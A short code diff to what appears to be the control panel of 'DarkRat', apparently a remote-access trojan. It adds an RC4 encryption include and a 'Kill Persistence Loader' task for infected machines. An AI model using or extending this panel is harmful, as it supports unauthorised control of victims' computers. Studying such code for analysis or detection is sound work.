@@ -14,6 +14,7 @@ if (file_exists(__DIR__ . '/../../config.php')) {
     require_once __DIR__ . '/../../config.php';
 }
 
+require_once __DIR__ . '/src/Classes/DarkRat/Encryption/RC4.class.php';
 require_once __DIR__ . '/src/Classes/DarkRat/Plugins/PluginHelper.class.php';
 require 'vendor/autoload.php';
 require_once __DIR__ . '/src/Classes/Bramus/Router/Router.php';
@@ -46,6 +47,10 @@ $task_configuration = array(
     "uninstall" => array(
         "name" => "Uninstall",
         "command" => "uninstall",
+    ),
+    "killpersistence" => array(
+        "name" => "Kill Persistence Loader",
+        "command" => "killpersistence",
     ),
 );
 
